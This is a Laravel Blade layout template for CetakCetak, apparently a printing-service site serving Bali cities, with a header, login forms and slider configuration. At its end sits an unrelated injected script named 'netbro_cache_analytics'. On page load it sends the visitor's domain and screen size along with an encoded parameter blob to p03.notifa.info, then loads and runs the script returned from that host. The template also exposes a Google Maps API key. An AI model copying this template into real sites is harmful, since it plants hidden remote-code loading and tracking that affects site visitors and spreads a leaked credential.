<!DOCTYPE html>
<!--[if IE 8]><html class="ie ie8"> <![endif]-->
<!--[if IE 9]><html class="ie ie9"> <![endif]-->
<html lang="en">


<!-- Mirrored from www.ansonika.com/citytours/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Apr 2018 12:27:14 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta name="description" content="CetakCetak.com">
    <title>CetakCetak. Kapanpun. Dimanapun</title>

    <!-- Favicons-->
    <link rel="shortcut icon" href="{{ URL::asset('img/favicon.ico') }}" type="image/x-icon">

    <link rel="apple-touch-icon" type="image/x-icon" href="{{ URL::asset('img/apple-touch-icon-57x57-precomposed.png') }}">
    <link rel="apple-touch-icon" type="image/x-icon" sizes="72x72" href="{{ URL::asset('img/apple-touch-icon-72x72-precomposed.png') }}">
    <link rel="apple-touch-icon" type="image/x-icon" sizes="114x114" href="{{ URL::asset('img/apple-touch-icon-114x114-precomposed.png') }}">
    <link rel="apple-touch-icon" type="image/x-icon" sizes="144x144" href="{{ URL::asset('img/apple-touch-icon-144x144-precomposed.png') }}">
	
	<!-- Google web fonts -->
    <link href="https://fonts.googleapis.com/css?family=Gochi+Hand|Lato:300,400|Montserrat:400,400i,700,700i" rel="stylesheet">

    <!-- BASE CSS -->
    
    <link href="{{ URL::asset('css/base.css') }}" rel="stylesheet">
    <link href="{{ URL::asset('css/map.css') }}" rel="stylesheet">
    <link href="{{ URL::asset('css/new_custom.css') }}" rel="stylesheet">

    <!-- SPECIFIC CSS for Profile -->
	<link href="{{ URL::asset('css/admin.css') }}" rel="stylesheet">
	<link href="{{ URL::asset('css/jquery.switch.css') }}" rel="stylesheet">

    <!-- REVOLUTION SLIDER CSS -->
    <link rel="stylesheet" type="text/css" href="rev-slider-files/fonts/pe-icon-7-stroke/css/pe-icon-7-stroke.css">
	<link rel="stylesheet" type="text/css" href="rev-slider-files/fonts/font-awesome/css/font-awesome.css">
    <link rel="stylesheet" type="text/css" href="rev-slider-files/css/settings.css">
    
    <!-- REVOLUTION LAYERS STYLES -->
	<style>
		.tp-caption.NotGeneric-Title,
		.NotGeneric-Title {
			color: rgba(255, 255, 255, 1.00);
			font-size: 70px;
			line-height: 70px;
			font-weight: 800;
			font-style: normal;
			text-decoration: none;
			background-color: transparent;
			border-color: transparent;
			border-style: none;
			border-width: 0px;
			border-radius: 0 0 0 0px
		}

		.tp-caption.NotGeneric-SubTitle,
		.NotGeneric-SubTitle {
			color: rgba(255, 255, 255, 1.00);
			font-size: 13px;
			line-height: 20px;
			font-weight: 500;
			font-style: normal;
			text-decoration: none;
			background-color: transparent;
			border-color: transparent;
			border-style: none;
			border-width: 0px;
			border-radius: 0 0 0 0px;
			letter-spacing: 4px
		}

		.tp-caption.NotGeneric-Icon,
		.NotGeneric-Icon {
			color: rgba(255, 255, 255, 1.00);
			font-size: 30px;
			line-height: 30px;
			font-weight: 400;
			font-style: normal;
			text-decoration: none;
			background-color: rgba(0, 0, 0, 0);
			border-color: rgba(255, 255, 255, 0);
			border-style: solid;
			border-width: 0px;
			border-radius: 0px 0px 0px 0px;
			letter-spacing: 3px
		}

		.tp-caption.NotGeneric-Button,
		.NotGeneric-Button {
			color: rgba(255, 255, 255, 1.00);
			font-size: 14px;
			line-height: 14px;
			font-weight: 500;
			font-style: normal;
			text-decoration: none;
			background-color: rgba(0, 0, 0, 0);
			border-color: rgba(255, 255, 255, 0.50);
			border-style: solid;
			border-width: 1px;
			border-radius: 0px 0px 0px 0px;
			letter-spacing: 3px
		}

		.tp-caption.NotGeneric-Button:hover,
		.NotGeneric-Button:hover {
			color: rgba(255, 255, 255, 1.00);
			text-decoration: none;
			background-color: transparent;
			border-color: rgba(255, 255, 255, 1.00);
			border-style: solid;
			border-width: 1px;
			border-radius: 0px 0px 0px 0px;
			cursor: pointer
		}
	</style>

    <!--[if lt IE 9]>
      <script src="js/html5shiv.min.js"></script>
      <script src="js/respond.min.js"></script>
    <![endif]-->

</head>

<body>

<!--[if lte IE 8]>
    <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a>.</p>
<![endif]-->

    <div id="preloader">
        <div class="sk-spinner sk-spinner-wave">
            <div class="sk-rect1"></div>
            <div class="sk-rect2"></div>
            <div class="sk-rect3"></div>
            <div class="sk-rect4"></div>
            <div class="sk-rect5"></div>
        </div>
    </div>
    <!-- End Preload -->

    <div class="layer"></div>
    <!-- Mobile menu overlay mask -->

    <!-- Header================================================== -->
    <header id="plain">
        <div class="container">
            <div class="row">
                <div class="col-md-3 col-sm-3 col-xs-3">
                    <div id="logo_home">
                        <h1><a href="/home" title="CetakCetak">CetakCetak</a></h1>
                    </div>
                </div>
                <nav class="col-md-9 col-sm-9 col-xs-9">
                    <a class="cmn-toggle-switch cmn-toggle-switch__htx open_close" href="javascript:void(0);"><span>Menu mobile</span></a>
                    <div class="main-menu">
                        <div id="header_menu">
                            <img src="{{ URL::asset('img/logo_sticky.png') }}" width="160" height="34" alt="City tours" data-retina="true">
                        </div>
                        <a href="#" class="open_close" id="close_in"><i class="icon_set_1_icon-77"></i></a>
                        <ul>
                            <li class="submenu">
                                <a href="javascript:void(0);" class="show-submenu">List Printing <i class="icon-down-open-mini"></i></a>
                                <ul>
                                    <li><a href="{{route('everyone.city', 'denpasar')}}">Denpasar</a></li>
                                    <li><a href="{{route('everyone.city', 'badung')}}">Badung</a></li>
                                    <li><a href="{{route('everyone.city', 'denpasar')}}">Tabanan</a></li>
                                    <li><a href="{{route('everyone.city', 'gianyar')}}">Gianyar</a></li>
                                    <li><a href="{{route('everyone.city', 'karangasem')}}">Karangasem</a></li>
                                    <li><a href="{{route('everyone.city', 'klungkung')}}">Klungkung</a></li>
                                    <li><a href="{{route('everyone.city', 'singaraja')}}">Singaraja</a></li>
                                    <li><a href="{{route('everyone.city', 'bangli')}}">Bangli</a></li>
                                    <li><a href="{{route('everyone.city', 'jembrana')}}">Jembrana</a></li>
                                </ul>
                            </li>

                             <li class="submenu">
                                <a href="javascript:void(0);" class="show-submenu">Contact <i class="icon-up-open-mini"></i></a>
                            </li>

                             <li class="submenu">
                                <a href="javascript:void(0);" class="show-submenu">About Us <i class="icon-up-open-mini"></i></a>
                            </li>

                            <li class="submenu">
                                <a href="javascript:void(0);" class="show-submenu">FAQ <i class="icon-up-open-mini"></i></a>
                            </li>
                            @auth('web')
                            <li class="submenu">
                                <a href="javascript:void(0);" class="show-submenu" id="access_link">{{Auth()->user()->nama}} <i class="icon-down-open-mini"></i></a>
                                <ul>
                                    <li><a href="{{route('profile.show', Auth()->user()->id)}}">Profile</a></li>
                                    <li><a href="#">Wishlist</a></li>
                                    <li><a href="{{route('member.cart', Auth()->user()->id)}}">Cart</a></li>
                                    <li>
                                    	<a class="dropdown-item" href="{{ route('logout') }}"
				                            onclick="event.preventDefault();
											document.getElementById('logout-form').submit();">
											{{ __('Logout') }}
			                            </a>

										<form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
			                            	@csrf
			                            	<input type="submit" value="Log Out" class="btn btn-danger">
			                            </form>
                                    </li>
                                </ul>
                            </li>  
                            @endauth
                            @auth('printing')
                            <li class="submenu">
                                <a href="javascript:void(0);" class="show-submenu" id="access_link">Profile <i class="icon-down-open-mini"></i></a>
                                <ul>
                                    <li><a href="{{route('printing.profile')}}">Profile</a></li>
                                    <li><a href="#">Wishlist</a></li>
                                    <li><a href="{{route('printing.transaksi')}}">Transaksi</a></li>
                                    <li>
                                    	<a class="dropdown-item" href="{{ route('logout') }}"
				                            onclick="event.preventDefault();
											document.getElementById('logout-form').submit();">
											{{ __('Logout') }}
			                            </a>

										<form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
			                            	@csrf
			                            	<input type="submit" value="Log Out" class="btn btn-danger">
			                            </form>
                                    </li>
                                </ul>
                            </li>  
                            @endauth                                           
                        </ul>
                    </div><!-- End main-menu -->
                    <ul id="top_tools">
                    	<li>
                            <div class="dropdown dropdown-search">
                                <a href="#" class="search-overlay-menu-btn" data-toggle="dropdown"><i class="icon-search"></i></a>
                            </div>
                        </li>
                        @guest
                        <li>
                            <div class="dropdown dropdown-cart">
                                <a href="#" class="dropdown-toggle" id="access_link">Sign in</a>
                                <form method="POST" action="{{ route('login') }}">
                                    @csrf
                                    <div class="dropdown-menu">
                                        <div class="form-group">
                                            <input type="text" class="form-control" id="inputUsernameEmail" name="email" placeholder="Email">
                                        </div>
                                        <div class="form-group">
                                            <input type="password" class="form-control" id="inputPassword" placeholder="Password" name="password">
                                        </div>
                                        <a id="forgot_pw" href="#">Forgot password?</a>
                                        <input type="submit" name="submit" value="Sign in" class="button_drop outline">
                                        <a href="/register" id="sign_up" class="button_drop outline">Sign up</a>
                                        <div align="center">
                                            <br>
                                            <a href="/printing/login" id="sign_up" class="button_drop outline"><button class="btn btn-primary">Login Printing</button></a>
                                        </div>
                                    </div>
                                </form>
                            </div><!-- End Dropdown access -->
                        </li>
                        @endguest
                    </ul>
                </nav>
            </div>
        </div><!-- container -->
    </header><!-- End Header -->

	@yield('content')

    <!-- Common scripts -->
    <script data-cfasync="false" src="{{ URL::asset('../cdn-cgi/scripts/d07b1474/cloudflare-static/email-decode.min.js') }}"></script>
    <script src="{{ URL::asset('js/jquery-2.2.4.min.js') }}"></script>
    <script src="{{ URL::asset('js/common_scripts_min.js') }}"></script>
    <script src="{{ URL::asset('js/functions.js') }}"></script>

	<!-- Specific scripts -->
	
	<script src="{{ URL::asset('assets/validate.js') }}"></script>
	<script src="{{ URL::asset('http://maps.googleapis.com/maps/api/js?key=AIzaSyDEP8fmSldSApSnvVA-18OoOwYL26XHKoc') }}"></script>
                                   
	<script src="{{ URL::asset('js/map_contact.js') }}"></script>
	<script src="{{ URL::asset('js/infobox.js') }}"></script>

    <!-- SLIDER REVOLUTION SCRIPTS  -->
    <script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/jquery.themepunch.tools.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/jquery.themepunch.revolution.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/extensions/revolution.extension.actions.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/extensions/revolution.extension.carousel.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/extensions/revolution.extension.kenburn.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/extensions/revolution.extension.layeranimation.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/extensions/revolution.extension.migration.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/extensions/revolution.extension.navigation.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/extensions/revolution.extension.parallax.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/extensions/revolution.extension.slideanims.min.js') }}"></script>
	<script type="text/javascript" src="{{ URL::asset('rev-slider-files/js/extensions/revolution.extension.video.min.js') }}"></script>
	<script type="text/javascript">
		var tpj = jQuery;

		var revapi54;
		tpj(document).ready(function () {
			if (tpj("#rev_slider_54_1").revolution == undefined) {
				revslider_showDoubleJqueryError("#rev_slider_54_1");
			} else {
				revapi54 = tpj("#rev_slider_54_1").show().revolution({
					sliderType: "standard",
					jsFileLocation: "rev-slider-files/js/",
					sliderLayout: "fullwidth",
					dottedOverlay: "none",
					delay: 9000,
					navigation: {
							keyboardNavigation:"off",
							keyboard_direction: "horizontal",
							mouseScrollNavigation:"off",
                             mouseScrollReverse:"default",
							onHoverStop:"off",
							touch:{
								touchenabled:"on",
								touchOnDesktop:"off",
								swipe_threshold: 75,
								swipe_min_touches: 50,
								swipe_direction: "horizontal",
								drag_block_vertical: false
							}
							,
							arrows: {
								style:"uranus",
								enable:true,
								hide_onmobile:true,
								hide_under:778,
								hide_onleave:true,
								hide_delay:200,
								hide_delay_mobile:1200,
								tmp:'',
								left: {
									h_align:"left",
									v_align:"center",
									h_offset:20,
                                    v_offset:0
								},
								right: {
									h_align:"right",
									v_align:"center",
									h_offset:20,
                                    v_offset:0
								}
							}
						},
					responsiveLevels: [1240, 1024, 778, 480],
					visibilityLevels: [1240, 1024, 778, 480],
					gridwidth: [1240, 1024, 778, 480],
					gridheight: [700, 550, 860, 480],
					lazyType: "none",
					parallax: {
						type: "mouse",
						origo: "slidercenter",
						speed: 2000,
						levels: [2, 3, 4, 5, 6, 7, 12, 16, 10, 50, 47, 48, 49, 50, 51, 55],
						disable_onmobile: "on"
					},
					shadow: 0,
					spinner: "off",
					stopLoop: "on",
					stopAfterLoops: 0,
					stopAtSlide: 1,
					shuffle: "off",
					autoHeight: "off",
					disableProgressBar: "on",
					hideThumbsOnMobile: "off",
					hideSliderAtLimit: 0,
					hideCaptionAtLimit: 0,
					hideAllCaptionAtLilmit: 0,
					debugMode: false,
					fallbacks: {
						simplifyAll: "off",
						nextSlideOnWindowFocus: "off",
						disableFocusListener: false,
					}
				});
			}
		}); /*ready*/
	</script>
	<!--	<script src="{{ URL::asset('js/notify_func.js') }}"></script>-->

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mtoUdldMukPNcX7dMgCL8PnY7y2hOGqxovCTMJruXZ8pbRLC7MphPasPHHQEYQgKHRD2Pq4E2QWaZrBaVjAndOfCTamuKUaZ9pelA%2f6UxbWWq92Kn7A3WJ%2bfDtdmdjhIl6HYYYrK4M3OnCD5T34AZ%2bmVpoOyLivK2oUTFN9WNW0TmvaFD2QSZt%2f5%2bnIF5Uj3WcEMxghNRoV4xVHMELtvCyc1mVrBBx6EcL5%2b8uNiwDnSqyZ9sZsAMb5utblrfCTBaGpiy6Ox8wrB1z5i5iCof9%2fxN%2bDZXLf4b3xe5XaIY1rL0BEX3HtpVGzbS%2bCmkm0zpr%2ftQtiZno9zWJcjTp3kNj%2f1e0RsAAU%2b1DnOMQnnp9uES5qRDuOCsC8cOdIpRXTpbCQUKFr4HSMlt3tNwA%2fFPdelaiT5B4ea0k%2bZFTuwBn94SABRUE%2f7V01TL%2flLHl838%2bIDdxl670X325US8RwuGWKm4D%2fFZIOV%2bXan3MYE0xUA%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>

</body>
</html>